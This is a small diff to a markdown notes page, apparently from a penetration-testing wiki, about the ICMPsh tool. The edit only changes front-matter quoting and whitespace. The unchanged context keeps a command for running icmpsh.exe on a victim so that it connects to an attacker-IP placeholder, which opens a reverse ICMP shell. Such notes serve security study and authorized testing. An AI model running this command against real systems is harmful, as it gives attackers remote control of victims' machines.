@@ -1,5 +1,5 @@
 ---
-description: 'https://github.com/inquisb/icmpsh'
+description: https://github.com/inquisb/icmpsh
 ---
 
 # ICMPsh
@@ -31,4 +31,3 @@ Upload **icmpsh.exe** to the victim and execute:
 ```bash
 icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
 ```
-
